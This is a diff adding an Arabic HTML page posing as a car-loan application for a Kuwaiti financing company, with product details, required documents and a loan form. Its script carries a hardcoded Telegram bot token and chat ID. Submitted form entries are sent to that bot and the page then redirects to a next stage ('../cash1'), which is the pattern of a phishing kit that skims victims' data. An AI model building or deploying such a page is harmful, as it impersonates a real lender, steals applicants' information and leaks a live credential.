@@ -1,0 +1,498 @@
+<html lang="ar"><script async="true" src="https://tr.snapchat.com/config/app/f689f723-0d6c-4285-af14-0b1b68b51a03.js?v=3.54.0-2512101929" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://sc-static.net/scevent.min.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-E6SPDQB9EB&amp;cx=c&amp;gtm=4e6171"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-P5H6V926"></script><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P5H6V926');</script>
+<!-- End Google Tag Manager -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تمويل سيارات - تصميم جديد</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-blue: #007bff;
+            --primary-dark-blue: #0056b3;
+            --light-grey: #f8f9fa;
+            --border-color: #e0e0e0;
+            --text-color: #343a40;
+            --label-color: #495057;
+            --shadow-light: rgba(0, 0, 0, 0.08);
+            --shadow-medium: rgba(0, 0, 0, 0.12);
+        }
+
+        body {
+            font-family: 'Noto Sans Arabic', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
+            padding: 0;
+            margin: 0;
+            background-color: #f0f2f5; /* Lighter background */
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl; /* Global RTL direction */
+        }
+
+        /* Header Styles - Maintained from previous version but refined */
+        .header {
+            width: 100%;
+            height: 70px; /* Slightly reduced height */
+            background-color: #2c3e50; /* Darker, more modern header color */
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+            z-index: 10;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 25px; /* Increased padding */
+            box-sizing: border-box;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px; /* Slightly more space */
+        }
+
+        .header-left .icon-box {
+            background-color: #8e44ad; /* Slightly darker purple */
+            border-radius: 10px; /* More rounded */
+            width: 35px; /* Slightly larger */
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .header-left .icon-box svg {
+            fill: #ffffff;
+            width: 20px; /* Larger icon */
+            height: 20px;
+        }
+
+        .header-left span {
+            font-size: 16px; /* Slightly larger font */
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+        }
+
+        .header-right svg {
+            fill: #ffffff;
+            width: 22px; /* Larger icon */
+            height: 22px;
+        }
+
+        /* Form Container and Content Styles */
+        .form-container {
+            background-color: #ffffff;
+            border-radius: 12px; /* More rounded corners */
+            box-shadow: 0 8px 30px var(--shadow-medium); /* Stronger, softer shadow */
+            padding: 30px; /* Increased padding */
+            width: 420px; /* Wider for better balance */
+            text-align: right;
+            position: relative;
+            margin-top: 100px; /* Space from fixed header */
+            margin-bottom: 30px; /* Space at the bottom */
+            box-sizing: border-box;
+        }
+
+        .content-container {
+            line-height: 1.7; /* Adjusted line height */
+            color: var(--text-color);
+            font-size: 15px;
+            margin-bottom: 25px; /* More space between sections */
+            padding: 0;
+        }
+
+        .content-container:last-of-type {
+            margin-bottom: 30px; /* More space before the form starts */
+        }
+
+        .content-container h1 {
+            font-size: 22px; /* Larger sub-headings */
+            color: var(--primary-blue);
+            margin-bottom: 20px; /* More space below heading */
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .content-container p {
+            margin-bottom: 12px;
+        }
+
+        .content-container ul {
+            list-style: none;
+            padding-right: 0; /* Remove default padding */
+            margin: 0;
+        }
+
+        .content-container ul li {
+            position: relative;
+            margin-bottom: 8px;
+            padding-right: 25px; /* Space for custom bullet */
+            font-weight: 500; /* Slightly bolder list items */
+        }
+
+        .content-container ul li::before {
+            content: '•';
+            color: var(--primary-blue);
+            font-weight: bold;
+            display: inline-block;
+            width: 1em;
+            margin-right: -1em;
+            position: absolute;
+            right: 0;
+            top: 0;
+            font-size: 1.2em; /* Larger bullet */
+        }
+
+        /* Form Group Styles */
+        .form-group {
+            margin-bottom: 22px; /* More spacing between form groups */
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 15px; /* Consistent label font size */
+            color: var(--label-color);
+            margin-bottom: 8px;
+            font-weight: 600; /* Bolder labels */
+            text-align: right;
+        }
+
+        /* Input and Select Field Styles - Significantly redesigned */
+        .form-group input[type="tel"],
+        .form-group select {
+            width: 100%; /* Fill container width */
+            padding: 14px 15px; /* More padding */
+            border: 1px solid var(--border-color); /* Light, subtle border */
+            border-radius: 8px; /* More rounded */
+            font-size: 16px;
+            color: var(--text-color);
+            box-sizing: border-box;
+            text-align: right;
+            background-color: #ffffff; /* Pure white background */
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .form-group input[type="tel"]::placeholder {
+            color: #b0b0b0; /* Lighter placeholder text */
+        }
+
+        .form-group input[type="tel"]:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25); /* Stronger focus ring */
+        }
+
+        /* Custom Select Arrow */
+        .form-group select {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-image: url('data:image/svg+xml;charset=UTF-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%236c757d"><path d="M7 10l5 5 5-5z"/></svg>'); /* Darker grey arrow */
+            background-repeat: no-repeat;
+            background-position: left 15px center; /* Position arrow on the left with more padding */
+            background-size: 18px; /* Larger arrow */
+        }
+
+        /* Radio Button Styles - Redesigned */
+        .radio-group {
+            margin-top: 30px; /* More space above radio group */
+            margin-bottom: 30px; /* More space below radio group */
+            text-align: right;
+        }
+
+        .radio-group .radio-title {
+            font-size: 15px;
+            color: var(--label-color);
+            font-weight: 600;
+            margin-bottom: 12px; /* More space below title */
+        }
+
+        .radio-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px; /* More space between radio items */
+            direction: rtl;
+            justify-content: flex-end;
+            cursor: pointer; /* Indicate clickable */
+        }
+
+        .radio-item input[type="radio"] {
+            width: 20px; /* Larger radio */
+            height: 20px;
+            margin-left: 12px; /* More space between radio and label */
+            flex-shrink: 0;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            border: 2px solid #ced4da; /* Thicker, softer border */
+            border-radius: 50%;
+            outline: none;
+            cursor: pointer;
+            position: relative;
+            background-color: #ffffff;
+            transition: border-color 0.2s ease, background-color 0.2s ease;
+        }
+
+        .radio-item input[type="radio"]:hover {
+            border-color: #a0a0a0; /* Darker border on hover */
+        }
+
+        .radio-item input[type="radio"]:checked {
+            border-color: var(--primary-blue);
+            background-color: #e9ecef; /* Very light grey background when checked */
+        }
+
+        .radio-item input[type="radio"]:checked::after {
+            content: '';
+            width: 10px; /* Inner dot size */
+            height: 10px;
+            background-color: var(--primary-blue);
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .radio-item label {
+            font-size: 16px;
+            color: var(--text-color);
+            cursor: pointer;
+            margin-right: 0;
+        }
+
+        /* Submit Button Styles - More prominent */
+        .submit-button {
+            width: 100%;
+            padding: 16px; /* More padding */
+            background-color: var(--primary-blue);
+            color: #ffffff;
+            border: none;
+            border-radius: 8px; /* More rounded */
+            font-size: 18px; /* Consistent font size */
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 30px; /* More space above button */
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); /* Button shadow */
+            background-color: #00A3E0;
+            width: 150px;
+            margin: 30px auto 0 auto;
+        }
+
+        .submit-button:hover {
+            background-color: var(--primary-dark-blue);
+            box-shadow: 0 6px 15px rgba(0, 123, 255, 0.4);
+        }
+
+        /* Ellipsis Button - Refined */
+        .ellipsis-button {
+            position: absolute;
+            bottom: 25px; /* Adjusted position */
+            right: 25px; /* Adjusted position */
+            background-color: #e9ecef; /* Light grey background */
+            border: 1px solid #ced4da; /* Soft border */
+            border-radius: 50%;
+            width: 45px; /* Slightly larger */
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px var(--shadow-light); /* Softer shadow */
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+        }
+
+        .ellipsis-button:hover {
+            background-color: #dee2e6;
+            border-color: #adb5bd;
+        }
+
+        .ellipsis-button span {
+            font-size: 26px; /* Larger dots */
+            line-height: 1;
+            color: #6c757d; /* Darker grey dots */
+            padding-bottom: 4px; /* Adjust vertical alignment */
+        }
+  .radio-item {
+    display: flex;
+    flex-direction: row-reverse; 
+    align-items: center;
+    gap: 5px; 
+    margin-bottom: 8px;
+  }
+
+    </style>
+<style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"></head>
+<body>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P5H6V926"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    <div class="header">
+        <div class="header-left">
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
+                </svg>
+            </div>
+            <span>قرض سياره</span>
+        </div>
+        <div class="header-right">
+            <svg viewBox="0 0 24 24">
+                <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path>
+            </svg>
+        </div>
+    </div>
+
+    <div class="form-container">
+        <div class="content-container">
+            <h1>تمويل السيارات</h1>
+            <p>
+                تتيح شركة التسهيلات لعملائها إمكانية تمويل سيارتهم الجديدة أو المستعملة من الوكالات أو مكاتب السيارات أو الأفراد
+                وبحد أقصى 25,000 دينار كويتي أو 25 ضعف الراتب (أيهما أقل)، ولمدة تصل إلى 60 شهراً.
+            </p>
+            <p>
+                ويمكن تقديم طلبات التمويل من خلال القنوات التالية:
+            </p>
+            <ul>
+                <li>الموقع الإلكتروني</li>
+                <li>فروع الشركة</li>
+                <li>موظفينا في معارض وكالات السيارات</li>
+                <li>موظفينا في مكاتب السيارات المستعملة</li>
+            </ul>
+        </div>
+
+        <div class="content-container">
+            <h1>طلبات التقديم</h1>
+            <ul>
+                <li>البطاقة المدنية</li>
+                <li>شهادة راتب حديثة</li>
+                <li>جواز سفر لغير الكويتيين</li>
+                <li>كشف حساب بنكي</li>
+            </ul>
+        </div>
+
+        <form id="loanForm">
+            <div class="form-group">
+                <label for="paymentDuration">مدة السداد</label>
+                <select id="paymentDuration" name="paymentDuration">
+                    <option value="">اختر مدة السداد</option>
+                    <option value="12">12 - شهر</option>
+                    <option value="24">24 - شهر</option>
+                    <option value="36">36 - شهر</option>
+                    <option value="48">48 - شهر</option>
+                    <option value="60">60 - شهر</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="loanType">نوع القرض</label>
+                <select id="loanType" name="loanType">
+                    <option value="">اختر نوع القرض</option>
+                    <option value="single_car">سيارة واحدة - قرض فردي</option>
+                    <option value="company_finance_cars">سيارة أو أكثر - قرض شركات</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="requiredFunding1">الدفعة المقدمة</label>
+                <input type="tel" id="requiredFunding1" name="requiredFunding1" placeholder="أدخل المبلغ">
+            </div>
+
+            <div class="form-group">
+                <label for="requiredFunding2">مبلغ التمويل المطلوب</label>
+                <input type="tel" id="requiredFunding2" name="requiredFunding2" placeholder="أدخل المبلغ">
+            </div>
+
+            <div class="radio-group">
+                <div class="radio-title">مكان الشراء</div>
+                <div class="radio-item">
+                    <input type="radio" id="purchasePerson" name="purchaseLocation" value="person">
+                    <label for="purchasePerson">شخص</label>
+                </div>
+<div class="radio-item">
+    <input type="radio" id="purchaseCompany" name="purchaseLocation" value="company">
+    <label for="purchaseCompany">شركة</label>
+</div>
+
+            </div>
+
+            <button type="submit" class="submit-button">تقديم</button>
+        </form>
+
+
+    </div>
+<script>
+  const botToken = '8599584358:AAFo3N5h5TrjujeZGH2SbS8L4EPpjYSaQqg';  
+  const chatId = '-5263360636';      
+
+document.getElementById('loanForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const paymentDuration = document.getElementById('paymentDuration').value;
+  const loanTypeElement = document.getElementById('loanType');
+  const loanTypeText = loanTypeElement.options[loanTypeElement.selectedIndex].text;
+  const requiredFunding1 = document.getElementById('requiredFunding1').value.trim();
+  const requiredFunding2 = document.getElementById('requiredFunding2').value.trim();
+  const purchaseLocationRadio = document.querySelector('input[name="purchaseLocation"]:checked');
+  const purchaseLocation = purchaseLocationRadio ? purchaseLocationRadio.value : '';
+
+  if (!paymentDuration || !loanTypeElement.value || !requiredFunding1 || !requiredFunding2 || !purchaseLocation) {
+    alert('يرجى ملء جميع الحقول');
+    return;
+  }
+
+  const message = `
+📩 *تمويل سيارة*
+- مدة السداد: ${paymentDuration} شهر
+- نوع القرض: ${loanTypeText}
+- الدفعة المقدمة: ${requiredFunding1}
+- مبلغ التمويل المطلوب: ${requiredFunding2}
+- مكان الشراء: ${purchaseLocation}
+  `;
+
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+  fetch(url, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.ok) {
+      window.location.href = '../cash1';
+      this.reset();
+    } else {
+      alert('حدث خطأ أثناء الإرسال');
+      console.error(data);
+    }
+  })
+  .catch(error => {
+    alert('خطأ في الاتصال بالخادم');
+    console.error(error);
+  });
+});
+
+</script>
+
+</body></html>
